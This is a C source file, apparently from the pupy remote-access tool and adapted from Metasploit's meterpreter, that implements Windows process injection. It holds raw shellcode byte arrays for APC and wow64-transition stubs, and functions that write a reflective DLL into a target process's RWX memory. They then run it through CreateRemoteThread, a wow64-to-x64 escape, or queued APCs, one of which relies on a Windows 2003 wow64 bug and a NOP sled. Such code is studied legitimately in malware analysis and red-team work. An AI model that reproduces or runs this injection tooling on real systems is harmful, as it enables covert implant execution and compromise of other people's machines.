/*
 This code is originally from meterpreter and has been modified to be integrated into pupy.
 original code :https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/common/arch/win/i386/

Meterpreter is available for use under the following license, commonly known as the
3-clause (or "modified") BSD license:

=========================================================================================

Meterpreter
-----------

Copyright (c) 2006-2013, Rapid7 Inc

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of
  conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice, this list of
  conditions and the following disclaimer in the documentation and/or other materials
  provided with the distribution.

* Neither the name of Rapid7 nor the names of its contributors may be used to endorse or
  promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

//#include "common.h"
#include <windows.h>

#include "thread.h"
#include "list.h"
#include "remote_thread.h"
#include "LoadLibraryR.h"
#include "base_inject.h"
#include <Tlhelp32.h>
#include "Python-dynload.h"


#define BREAK_ON_ERROR( str ) { PyErr_SetString(PyExc_Exception, str); break; }

// see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
BYTE migrate_executex64[] =	"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
							"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
							"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
							"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
							"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
BYTE migrate_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
							"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
							"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
							"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
							"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
							"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
							"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
							"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
							"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
							"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
							"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
							"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
							"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
							"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
							"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
							"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
							"\x48\x83\xC4\x50\x48\x89\xFC\xC3";

// see '/msf3/external/source/shellcode/x86/migrate/apc.asm'
BYTE apc_stub_x86[] =		"\xFC\x8B\x74\x24\x04\x55\x89\xE5\xE8\x89\x00\x00\x00\x60\x89\xE5"
							"\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F"
							"\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF"
							"\x0D\x01\xC7\xE2\xF0\x52\x57\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B"
							"\x40\x78\x85\xC0\x74\x4A\x01\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01"
							"\xD3\xE3\x3C\x49\x8B\x34\x8B\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF"
							"\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58"
							"\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04"
							"\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58"
							"\x5F\x5A\x8B\x12\xEB\x86\x5B\x80\x7E\x10\x00\x75\x3B\xC6\x46\x10"
							"\x01\x68\xA6\x95\xBD\x9D\xFF\xD3\x3C\x06\x7C\x1A\x31\xC9\x64\x8B"
							"\x41\x18\x39\x88\xA8\x01\x00\x00\x75\x0C\x8D\x93\xCF\x00\x00\x00"
							"\x89\x90\xA8\x01\x00\x00\x31\xC9\x51\x51\xFF\x76\x08\xFF\x36\x51"
							"\x51\x68\x38\x68\x0D\x16\xFF\xD3\xC9\xC2\x0C\x00\x00\x00\x00\x00"
							"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
							"\x00\x00\x00\x00";

// see '/msf3/external/source/shellcode/x64/migrate/apc.asm'
BYTE apc_stub_x64[] =		"\xFC\x80\x79\x10\x00\x0F\x85\x13\x01\x00\x00\xC6\x41\x10\x01\x48"
							"\x83\xEC\x78\xE8\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48"
							"\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48"
							"\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C"
							"\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41"
							"\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78\x18\x0B"
							"\x02\x75\x72\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01"
							"\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF"
							"\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41"
							"\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45"
							"\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C"
							"\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41"
							"\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20"
							"\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF"
							"\x5D\x48\x31\xD2\x65\x48\x8B\x42\x30\x48\x39\x90\xC8\x02\x00\x00"
							"\x75\x0E\x48\x8D\x95\x07\x01\x00\x00\x48\x89\x90\xC8\x02\x00\x00"
							"\x4C\x8B\x01\x4C\x8B\x49\x08\x48\x31\xC9\x48\x31\xD2\x51\x51\x41"
							"\xBA\x38\x68\x0D\x16\xFF\xD5\x48\x81\xC4\xA8\x00\x00\x00\xC3\x00"
							"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
							"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
							"\x00\x00\x00";

/*
 * Attempt to gain code execution in the remote process via a call to ntdll!NtQueueApcThread
 * Note: Windows Server 2008R2 can blue screen if you use APC injection to inject into another sessions csrss.exe
 */
DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter )
{
	DWORD dwResult                     = ERROR_ACCESS_DENIED;
	HMODULE hNtdll                     = NULL;
	NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;
	HANDLE hThreadSnap                 = NULL;
	LPVOID lpApcStub                   = NULL;
	LPVOID lpRemoteApcStub             = NULL;
	LPVOID lpRemoteApcContext          = NULL;
	LIST * thread_list                 = NULL;
	THREADENTRY32 t                    = {0};
	APCCONTEXT ctx                     = {0};
	DWORD dwApcStubLength              = 0;

	do
	{
		thread_list = list_create();
		if( !thread_list )
			break;

		ctx.s.lpStartAddress = lpStartAddress;
		ctx.p.lpParameter    = lpParameter;
		ctx.bExecuted        = FALSE;

		t.dwSize = sizeof( THREADENTRY32 );

		// Get the architecture specific apc migration stub...
		if( dwDestinationArch == PROCESS_ARCH_X86 )
		{
			if( dwPupyArch == PROCESS_ARCH_X64 )
			{
				// injecting x64->x86(wow64)

				// Our injected APC ends up running in native x64 mode within the wow64 process and as such
				// will need a modified stub to transition to wow64 before execuing the apc_stub_x86 stub.

				// This issue does not effect x64->x86 injection using the kernel32!CreateRemoteThread method though.

				SetLastError( ERROR_ACCESS_DENIED );
				BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Can't do x64->x86 APC injection yet." )
			}
			else
			{
				// injecting x86->x86
				lpApcStub       = &apc_stub_x86;
				dwApcStubLength = sizeof( apc_stub_x86 );
			}
		}
		else if( dwDestinationArch == PROCESS_ARCH_X64 )
		{
			// injecting x64->x64 (and the same stub for x86(wow64)->x64)
			lpApcStub       = &apc_stub_x64;
			dwApcStubLength = sizeof( apc_stub_x64 );

			if( dwPupyArch == PROCESS_ARCH_X86 )
			{
				// injecting x86(wow64)->x64

				// For now we leverage a bug in wow64 to get x86->x64 injection working, this
				// will simply fail gracefully on systems where the technique does not work.

				MEMORY_BASIC_INFORMATION mbi = {0};
				LPVOID lpRemoteAddress       = NULL;
				BYTE * lpNopSled             = NULL;
				BYTE bStub[]                 = "\x48\x89\xC8\x48\xC1\xE1\x20\x48\xC1\xE9\x20\x48\xC1\xE8\x20\xFF\xE0";

				/*
					// On Windows 2003 x64 there is a bug in the implementation of NtQueueApcThread for wow64 processes.
					// The call from a wow64 process to NtQueueApcThread to inject an APC into a native x64 process is sucessful,
					// however the start address of the new APC in the native x64 process is not what we specify but instead it is
					// the address of the wow64.dll export wow64!Wow64ApcRoutine as found in the wow64 process! We can simple VirtualAlloc
					// this address (No ASLR on Windows 2003) and write a simple NOP sled which will jump to our real APC. From there
					// injection will continue as normal.

					// The registers on the native x64 process after the queued APC is attempted to run:
					rip = 000000006B0095F0                             // address of wow64!Wow64ApcRoutine as found in the wow64 process
					rcx = ( dwApcRoutine << 32 ) | dwApcRoutineContext // (our start address and param)
					rdx = dwApcStatusBlock                             // unused
					r8  = dwApcReserved                                // unused

					// On the WOW64 process side:
					wow64:000000006B0095F0 ; Exported entry   3. Wow64ApcRoutine
					wow64:000000006B0095F0
					wow64:000000006B0095F0	public Wow64ApcRoutine

					// On the native x64 process side:
					ntdll:0000000077EF30A0 public KiUserApcDispatcher
					ntdll:0000000077EF30A0	mov     rcx, [rsp]    // 32bit dwApcRoutine and 32bit dwApcRoutineContext into 64bit value
					ntdll:0000000077EF30A4	mov     rdx, [rsp+8]  // 32bit dwApcStatusBlock
					ntdll:0000000077EF30A9	mov     r8, [rsp+10h] // 32bit dwApcReserved
					ntdll:0000000077EF30AE	mov     r9, rsp
					ntdll:0000000077EF30B1	call    qword ptr [rsp+18h] // <--- we call the other processes wow64 address for wow64!Wow64ApcRoutine!

					// Our bStub:
					00000000  4889C8            mov rax, rcx
					00000003  48C1E120          shl rcx, 32
					00000007  48C1E920          shr rcx, 32
					0000000B  48C1E820          shr rax, 32
					0000000F  FFE0              jmp rax
				*/

				// alloc the address of the wow64!Wow64ApcRoutine export in the remote process...
				// TO-DO: parse the PE64 executable wow64.dll to get this at runtime.
				lpRemoteAddress = VirtualAllocEx( hProcess, (LPVOID)0x6B0095F0, 8192, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
				if( !lpRemoteAddress )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed" );

				if( VirtualQueryEx( hProcess, lpRemoteAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION) ) == 0 )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualQueryEx failed" );

				lpNopSled = (BYTE *)malloc( mbi.RegionSize );
				if( !lpNopSled )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: malloc lpNopSled failed" );

				memset( lpNopSled, 0x90, mbi.RegionSize );

				if( !WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )

				if( !WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed" )

				free( lpNopSled );
			}
		}
		else
		{
			SetLastError( ERROR_BAD_ENVIRONMENT );
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Invalid target architecture" )
		}

		hNtdll = LoadLibraryA( "ntdll" );
		if( !hNtdll )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: LoadLibraryA failed" )

		pNtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddress( hNtdll, "NtQueueApcThread" );
		if( !pNtQueueApcThread )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed" )

		hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
		if( !hThreadSnap )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )

		if( !Thread32First( hThreadSnap, &t ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )

		// Allocate memory for the apc stub and context
		lpRemoteApcStub = VirtualAllocEx( hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !lpRemoteApcStub )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx failed" )

		// Simply determine the apc context address
		lpRemoteApcContext = ( (BYTE *)lpRemoteApcStub + dwApcStubLength );

		//printf( "[INJECT] -- dwPupyArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwPupyArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );

		// Write the apc stub to memory...
		if( !WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed" )

		// Write the apc context to memory...
		if( !WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed" )

		do
		{
			HANDLE hThread = NULL;

			// Only proceed if we are targeting a thread in the target process
			if( t.th32OwnerProcessID != dwProcessID )
				continue;

			// Open a handle to this thread so we can do the apc injection
			hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, t.th32ThreadID );
			if( !hThread )
				continue;

			//printf("[INJECT] inject_via_apcthread: Trying to inject into thread %d", t.th32ThreadID );

			// Only inject into threads we can suspend to avoid synchronization issue whereby the new metsrv will attempt
			// an ssl connection back but the client side will not be ready to accept it and we loose the session.
			if( SuspendThread( hThread ) != (DWORD)-1 )
			{
				list_push( thread_list, hThread );

				// Queue up our apc stub to run in the target thread, when our apc stub is run (when the target
				// thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
				// Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
				if( pNtQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
				{
					//printf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.", t.th32ThreadID );
					dwResult = ERROR_SUCCESS;
				}
				else
				{
					//printf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.", t.th32ThreadID );
				}
			}
			else
			{
				CloseHandle( hThread );
			}

			// keep searching for more target threads to inject our apc stub into...

		} while( Thread32Next( hThreadSnap, &t ) );

	} while( 0 );

/*
	if( dwResult == ERROR_SUCCESS && remote && response )
	{
		// We should only run this block if we are being used for migration...

		// Send a successful response to let the ruby side know that we've pretty
		// much successfully migrated and have reached the point of no return
		packet_add_tlv_uint( response, TLV_TYPE_MIGRATE_TECHNIQUE, MIGRATE_TECHNIQUE_APCQUEUE );
		packet_transmit_response( ERROR_SUCCESS, remote, response );

		// Sleep to give the remote side a chance to catch up...
		Sleep( 2000 );
	}
*/
	if( thread_list )
	{
		// Resume all the threads which we queued our apc into as the remote
		// client side will now be ready to handle the new ssl conenction.
		while( TRUE )
		{
			HANDLE t = (HANDLE)list_pop( thread_list );
			if( !t )
				break;
			ResumeThread( t );
			CloseHandle( t );
		}

		list_destroy( thread_list );
	}

	if( hThreadSnap )
		CloseHandle( hThreadSnap );

	if( hNtdll )
		FreeLibrary( hNtdll );

	SetLastError( dwResult );

	return dwResult;
}

/*
 * Attempt to gain code execution in a native x64 process from a wow64 process by transitioning out of the wow64 (x86)
 * enviroment into a native x64 enviroment and accessing the native win64 API's.
 * Note: On Windows 2003 the injection will work but in the target x64 process issues occur with new
 *       threads (kernel32!CreateThread will return ERROR_NOT_ENOUGH_MEMORY). Because of this we filter out
 *       Windows 2003 from this method of injection, however the APC injection method will work on 2003.
 */
DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE * pThread )
{
	DWORD dwResult           = ERROR_SUCCESS;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;
	OSVERSIONINFO os         = {0};

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: GetVersionEx failed" )

		// filter out Windows 2003
		if ( os.dwMajorVersion == 5 && os.dwMinorVersion == 2 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported." )
		}

		// alloc a RWX buffer in this process for the EXECUTEX64 function
		pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(migrate_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pExecuteX64 )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed" )

		// alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
		pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(migrate_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pX64function )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed" )

		// copy over the wow64->x64 stub
		memcpy( pExecuteX64, &migrate_executex64, sizeof(migrate_executex64) );

		// copy over the native x64 function
		memcpy( pX64function, &migrate_wownativex, sizeof(migrate_wownativex) );

		// set the context
		ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sizeof(migrate_wownativex) );

		ctx->h.hProcess       = hProcess;
		ctx->s.lpStartAddress = lpStartAddress;
		ctx->p.lpParameter    = lpParameter;
		ctx->t.hThread        = NULL;

		//printf( "[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08X, pX64function=0x%08X, ctx=0x%08X", pExecuteX64, pX64function, ctx );

		// Transition this wow64 process into native x64 and call pX64function( ctx )
		// The native function will use the native Win64 API's to create a remote thread in the target process.
		if( !pExecuteX64( pX64function, (DWORD)ctx ) )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed" )
		}

		if( !ctx->t.hThread )
		{
			SetLastError( ERROR_INVALID_HANDLE );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL" )
		}

		// Success! grab the new thread handle from of the context
		*pThread = ctx->t.hThread;

		//printf( "[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08X", ctx->t.hThread );

	} while( 0 );

	if( pExecuteX64 )
		VirtualFree( pExecuteX64, 0, MEM_DECOMMIT );

	if( pX64function )
		VirtualFree( pX64function, 0, MEM_DECOMMIT );

	return dwResult;
}

/*
 * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
 */
DWORD inject_via_remotethread(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
	HANDLE hThread = NULL;

	do
	{
		// Create the thread in the remote process. Create suspended in case the call to CreateRemoteThread
		// fails, giving us a chance to try an alternative method or fail migration gracefully.
		hThread = create_remote_thread(hProcess, 1024 * 1024, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
		if (!hThread)
		{
			if (dwPupyArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
			{
				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;

				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
				{
					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
				}
			}
			else
			{
				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
			}
		}
		else
		{
			//printf("[INJECT] inject_via_remotethread: succeeded");
		}
/*
		if (remote && response)
		{
			//printf("[INJECT] inject_via_remotethread: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			//printf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			Sleep(2000);
		}
*/
		//Sleep(2000);
		//printf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
		// Resume the injected thread...
		if (ResumeThread(hThread) == (DWORD)-1)
		{
			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
		}

	} while (0);

	if (hThread)
	{
		CloseHandle(hThread);
	}

	SetLastError(dwResult);

	return dwResult;
}

/*
 * Inject a DLL image into a process via Reflective DLL Injection.
 *
 * Note: You must inject a DLL of the correct target process architecture, (e.g. a PE32 DLL for
 *       an x86 (wow64) process or a PE64 DLL for an x64 process). The wrapper function ps_inject_dll()
 *       in stdapi will handle this automatically.
 *
 * Note: This function largely depreciates LoadRemoteLibraryR().
 */
DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght, const char * cpCommandLine , int remoteProcessArch)
{
	DWORD dwResult                 = ERROR_ACCESS_DENIED;
	DWORD dwNativeArch             = PROCESS_ARCH_UNKNOWN;
	LPVOID lpRemoteCommandLine     = NULL;
	HANDLE hProcess                = NULL;
	LPVOID lpRemoteLibraryBuffer   = NULL;
	LPVOID lpReflectiveLoader      = NULL;
	DWORD dwReflectiveLoaderOffset = 0;

	do
	{
		if( !lpDllBuffer || !dwDllLenght )
			BREAK_ON_ERROR( "[INJECT] inject_dll.  No Dll buffer supplied.");

		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer );
		if( !dwReflectiveLoaderOffset )
			BREAK_ON_ERROR( "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.");

		hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid );
		if( !hProcess )
			BREAK_ON_ERROR( "[INJECT] inject_dll. OpenProcess failed." );

		if( cpCommandLine )
		{
			// alloc some space and write the commandline which we will pass to the injected dll...
			lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cpCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
			if( !lpRemoteCommandLine )
				BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx 1 failed" );

			if( !WriteProcessMemory( hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine)+1, NULL ) )
				BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 1 failed" );
		}

		// alloc memory (RWX) in the host process for the image...
		lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwDllLenght, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !lpRemoteLibraryBuffer )
			BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx 2 failed" );

		// write the image into the host process...
		if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLenght, NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 2 failed" );

		// add the offset to ReflectiveLoader() to the remote library address...
		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );

		// First we try to inject by directly creating a remote thread in the target process
		if( inject_via_remotethread( hProcess, remoteProcessArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
		{
			//printf( "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread..." );

			// If that fails we can try to migrate via a queued APC in the target process
			if( inject_via_apcthread( hProcess, dwPid, remoteProcessArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
				BREAK_ON_ERROR( "[INJECT] inject_dll. inject_via_apcthread failed" )
		}

		dwResult = ERROR_SUCCESS;

	} while( 0 );

	if( hProcess )
		CloseHandle( hProcess );

	return dwResult;
}
